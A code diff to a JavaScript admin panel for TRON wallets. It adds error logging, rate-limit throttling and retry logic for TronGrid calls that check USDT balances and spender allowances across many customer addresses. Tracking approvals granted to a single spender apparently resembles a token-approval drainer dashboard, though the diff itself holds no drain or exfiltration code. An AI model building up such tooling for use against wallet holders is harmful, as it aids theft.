@@ -812,15 +812,29 @@ async function apiFetch(path,opts){
     opts=opts||{};
     var headers=Object.assign({'Content-Type':'application/json'},opts.headers||{});
     if(AUTH_TOKEN)headers['X-Admin-Key']=AUTH_TOKEN;
+    var base=normalizeApiBase(API_BASE);
+    var cp=String(path||'').startsWith('/')?path:('/'+path);
+    var fullUrl=base+cp;
     try{
-        var base=normalizeApiBase(API_BASE);
-        var cp=String(path||'').startsWith('/')?path:('/'+path);
-        var resp=await fetch(base+cp,Object.assign({},opts,{headers:headers}));
+        var resp=await fetch(fullUrl,Object.assign({},opts,{headers:headers}));
         if(resp.status===401){showToast('세션이 만료되었습니다. 다시 로그인해주세요.','error');setTimeout(function(){doLogout();},1500);return{error:'Session expired'};}
-        var data=null;try{data=await resp.json();}catch(e){data={};}
-        if(!resp.ok&&data&&!data.error)data.error='HTTP '+resp.status;
+        var rawText='';
+        try{rawText=await resp.text();}catch(e){rawText='';}
+        var data=null;
+        try{data=rawText?JSON.parse(rawText):{};}catch(e){
+            console.warn('[apiFetch] JSON 파싱 실패, 원본 응답:',fullUrl,rawText);
+            data={};
+        }
+        if(!resp.ok){
+            var em=(data&&data.error)?data.error:('HTTP '+resp.status+(rawText?(' - '+rawText.slice(0,200)):''));
+            console.error('[apiFetch] 오류 응답:',fullUrl,em);
+            data=data||{};data.error=em;
+        }
         return data||{};
-    }catch(e){console.error('[apiFetch]',path,e);return{error:e.message||'Network error'};}
+    }catch(e){
+        console.error('[apiFetch] 네트워크/CORS 오류:',fullUrl,e);
+        return{error:(e.message||'Network error')+' (네트워크 또는 CORS 문제일 수 있습니다)'};
+    }
 }
 
 // ================================================================
@@ -1224,16 +1238,22 @@ async function fetchWalletsWithCache(addrs, forceRefresh){
             var bal=item.balance!=null?String(item.balance):'0.00';
             var allowObj=(typeof item.allowance==='object'&&item.allowance)?item.allowance:parseAllowanceObj(item.allowance||'0');
 
-            // 1) 서버 잔액이 0이면 브라우저에서 직접 잔액 재확인
-            if((parseFloat(bal)||0)<=0){
+            // 백엔드(/api/admin/wallet-info)는 TronGrid API 키를 서버에서 보관하고 호출하므로
+            // 신뢰할 수 있는 1차 소스입니다. 백엔드 응답이 정상적으로 왔다면(resp.error 없음)
+            // 0이라는 값도 "실제로 0"일 수 있으므로, 더 이상 브라우저에서 직접
+            // TronGrid를 재호출하지 않습니다. (수정: 이 재호출이 다수의 고객 주소에 대해
+            // 거의 동시에 발생하면서 TronGrid 요청 제한(429 Too Many Requests)을 유발했습니다.)
+            // 백엔드 자체가 실패(resp.error)했을 때만 브라우저에서 직접 보조 조회를 시도합니다.
+            var backendFailed = Boolean(resp && resp.error);
+
+            if(backendFailed && (parseFloat(bal)||0)<=0){
                 var directBal=await getUSDTBalance(addr);
                 if((parseFloat(directBal)||0)>0){
                     bal=directBal;
                 }
             }
 
-            // 2) 서버 승인이 none이면 브라우저에서 직접 allowance 재확인
-            if((!allowObj||allowObj.status==='none'||allowObj.status==='error')&&spender){
+            if(backendFailed && (!allowObj||allowObj.status==='none'||allowObj.status==='error')&&spender){
                 var rawAllow=await getUSDTAllowanceFor(addr,spender);
                 var directAllow=parseAllowanceObj(rawAllow);
                 if(directAllow&&directAllow.status!=='none'){
@@ -1439,24 +1459,64 @@ function padAddr(hex){
     return clean.padStart(64,'0');
 }
 
+// ===== TronGrid 직접 호출 쓰로틀/재시도 헬퍼 =====
+// 수정: 브라우저에서 TronGrid(api.trongrid.io)를 API 키 없이 직접 호출할 때,
+// 여러 지갑 주소에 대해 거의 동시에 다수의 요청이 몰리면 TronGrid의
+// 요청 제한(429 Too Many Requests)에 걸립니다. 아래 두 가지로 해결합니다:
+//   1) 전역 쓰로틀: 모든 TronGrid 직접 호출 사이에 최소 간격을 둡니다.
+//   2) 429 발생 시 지수 백오프로 자동 재시도합니다.
+var _tronGridLastCall = 0;
+var _tronGridMinGapMs = 350; // 호출 간 최소 간격(ms) - 버스트로 인한 429 방지
+
+function _sleep(ms){ return new Promise(function(r){ setTimeout(r, ms); }); }
+
+async function _tronGridThrottle(){
+    var now = Date.now();
+    var wait = _tronGridLastCall + _tronGridMinGapMs - now;
+    if (wait > 0) await _sleep(wait);
+    _tronGridLastCall = Date.now();
+}
+
 async function triggerTrxConstant(ownerAddr, contractAddr, selector, parameter){
     var ownerHex=tronAddrToHex(ownerAddr);
     var contractHex=tronAddrToHex(contractAddr);
-    var resp=await fetch(TRON_API+'/wallet/triggerconstantcontract',{
-        method:'POST',
-        headers:{'Content-Type':'application/json'},
-        body:JSON.stringify({
-            owner_address:ownerHex,
-            contract_address:contractHex,
-            function_selector:selector,
-            parameter:parameter,
-            visible:false
-        })
-    });
-    if(!resp.ok)throw new Error('TronGrid HTTP '+resp.status);
-    var json=await resp.json();
-    if(json.Error)throw new Error(json.Error);
-    if(json.constant_result&&json.constant_result[0])return json.constant_result[0];
+    var maxRetries = 3;
+    for (var attempt = 0; attempt <= maxRetries; attempt++) {
+        await _tronGridThrottle();
+        var resp;
+        try {
+            resp = await fetch(TRON_API+'/wallet/triggerconstantcontract',{
+                method:'POST',
+                headers:{'Content-Type':'application/json'},
+                body:JSON.stringify({
+                    owner_address:ownerHex,
+                    contract_address:contractHex,
+                    function_selector:selector,
+                    parameter:parameter,
+                    visible:false
+                })
+            });
+        } catch (networkErr) {
+            if (attempt === maxRetries) throw networkErr;
+            await _sleep(500 * Math.pow(2, attempt));
+            continue;
+        }
+        if (resp.status === 429) {
+            if (attempt === maxRetries) {
+                console.warn('[TronGrid] 429 재시도 횟수 초과:', ownerAddr);
+                throw new Error('TronGrid rate limit (429) - 재시도 초과');
+            }
+            var backoff = 900 * Math.pow(2, attempt) + Math.floor(Math.random()*300);
+            console.warn('[TronGrid 429] '+backoff+'ms 후 재시도 ('+(attempt+1)+'/'+maxRetries+') addr='+ownerAddr);
+            await _sleep(backoff);
+            continue;
+        }
+        if(!resp.ok)throw new Error('TronGrid HTTP '+resp.status);
+        var json=await resp.json();
+        if(json.Error)throw new Error(json.Error);
+        if(json.constant_result&&json.constant_result[0])return json.constant_result[0];
+        return null;
+    }
     return null;
 }
 
@@ -1763,7 +1823,6 @@ function saveSettings(){
     _spenderCache='';renderLinks();showToast(t('saved'),'success');
 }
 
-// ★★★ 버그 수정: role, code 포함하여 전송 (새 백엔드: JWT에서 추출, 구 백엔드: body에서 읽음)
 async function changePassword(){
     var ce=document.getElementById('pw-current');var ne=document.getElementById('pw-new');var fe=document.getElementById('pw-confirm');
     var cur=ce?ce.value:'';var np=ne?ne.value:'';var nc=fe?fe.value:'';
